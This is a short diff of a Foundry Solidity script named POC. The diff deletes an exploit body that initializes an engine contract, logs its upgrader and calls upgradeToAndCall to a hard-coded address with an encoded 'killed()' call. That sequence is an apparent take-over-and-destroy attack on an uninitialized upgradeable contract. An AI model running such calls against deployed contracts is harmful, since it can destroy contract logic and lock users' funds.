@@ -11,10 +11,7 @@ contract POC is Script {
     function run() external{
         vm.startBroadcast();
     
-        engineAddress.initialize();
-        console.log("Upgrader is :", engineAddress.upgrader());
-        bytes memory encodedData = abi.encodeWithSignature("killed()");
-        engineAddress.upgradeToAndCall(0x19d094D6389c30F7341644Ca6473830c4F416Dd3, encodedData);
+        
         
         vm.stopBroadcast();
     }
